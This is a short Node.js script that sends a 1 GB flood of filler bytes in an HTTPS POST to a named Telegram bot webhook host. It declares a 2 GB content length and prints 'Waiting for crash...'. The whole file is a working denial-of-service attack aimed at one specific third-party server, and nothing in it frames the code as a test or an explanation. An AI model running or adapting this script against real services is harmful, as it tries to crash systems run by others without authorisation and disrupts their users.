const http = require('http');
const https = require('https');

const req = https.request({
  hostname: 'groza-bot.alwaysdata.net',
  port: 443,
  path: '/api/telegram-webhook-8516017309',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': 2000000000
  }
}, (res) => {
  console.log('Response:', res.statusCode);
});

req.on('error', (e) => {
  console.error('Request error:', e.message);
});

const chunk = Buffer.alloc(1024 * 1024, 'A'); // 1MB chunk
let sent = 0;

function sendChunks() {
  for (let i = 0; i < 100; i++) { // Send 100MB per batch
    req.write(chunk);
    sent += 1;
    if (sent >= 1000) { // Send 1GB total
      console.log('Sent 1GB. Waiting for crash...');
      req.end();
      return;
    }
  }
  console.log(`Sent ${sent}MB...`);
  setTimeout(sendChunks, 10);
}

sendChunks();
